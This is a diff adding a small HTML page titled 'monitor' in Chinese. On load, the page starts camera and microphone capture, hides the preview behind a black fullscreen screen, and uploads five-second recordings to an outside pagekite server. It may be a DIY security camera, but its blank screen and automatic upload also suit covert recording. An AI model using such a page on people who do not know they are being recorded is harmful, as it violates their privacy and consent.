@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>監視器</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            width: 100%;
+            height: 100vh;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            color: #fff;
+        }
+        
+        #container {
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+        }
+        
+        #video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="container"></div>
+    <video id="video" autoplay muted playsinline></video>
+
+    <script>
+        const CONFIG = {
+            BACKEND_URL: 'https://chung0930.pagekite.me/upload',
+            CHUNK_DURATION_MS: 5000,
+            CLIENT_ID: 'client_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+            SECRET_TOKEN: 'your_secret_token_here'
+        };
+
+        let mediaRecorder = null;
+        let stream = null;
+        let recordedChunks = [];
+        let isRecording = false;
+
+        async function startRecording() {
+            try {
+                const constraints = {
+                    video: { width: { ideal: 1920 }, height: { ideal: 1080 } },
+                    audio: { echoCancellation: true, noiseSuppression: true }
+                };
+
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                const mimeType = getSupportedMimeType();
+                if (!mimeType) throw new Error('瀏覽器不支援錄製格式');
+
+                mediaRecorder = new MediaRecorder(stream, { mimeType });
+                recordedChunks = [];
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) recordedChunks.push(event.data);
+                };
+
+                mediaRecorder.start();
+                isRecording = true;
+
+                enterFullscreen();
+                startChunkUploadTimer();
+
+            } catch (error) {
+                console.error('錄製失敗:', error);
+            }
+        }
+
+        function getSupportedMimeType() {
+            const types = ['video/webm;codecs=vp8,opus', 'video/webm;codecs=vp9,opus', 'video/webm', 'video/mp4'];
+            for (const type of types) {
+                if (MediaRecorder.isTypeSupported(type)) return type;
+            }
+            return null;
+        }
+
+        function startChunkUploadTimer() {
+            setInterval(async () => {
+                if (isRecording && recordedChunks.length > 0) {
+                    await uploadChunk();
+                }
+            }, CONFIG.CHUNK_DURATION_MS);
+        }
+
+        async function uploadChunk() {
+            if (recordedChunks.length === 0) return;
+
+            try {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                recordedChunks = [];
+
+                const timestamp = new Date().toISOString();
+                const filename = `recording_${timestamp.replace(/[:.]/g, '-')}.webm`;
+
+                const formData = new FormData();
+                formData.append('file', blob, filename);
+                formData.append('filename', filename);
+                formData.append('timestamp', timestamp);
+                formData.append('client_id', CONFIG.CLIENT_ID);
+
+                const response = await fetch(CONFIG.BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Authorization': `Bearer ${CONFIG.SECRET_TOKEN}` },
+                    body: formData
+                });
+
+                if (!response.ok) {
+                    console.error('上傳失敗:', response.status);
+                }
+            } catch (error) {
+                console.error('上傳錯誤:', error);
+            }
+        }
+
+        async function enterFullscreen() {
+            try {
+                const container = document.getElementById('container');
+                if (container.requestFullscreen) {
+                    await container.requestFullscreen();
+                } else if (container.webkitRequestFullscreen) {
+                    await container.webkitRequestFullscreen();
+                }
+            } catch (error) {
+                console.warn('全螢幕請求失敗:', error);
+            }
+        }
+
+        window.addEventListener('load', () => {
+            startRecording();
+        });
+
+        window.addEventListener('beforeunload', () => {
+            if (mediaRecorder && isRecording) {
+                mediaRecorder.stop();
+                if (stream) stream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
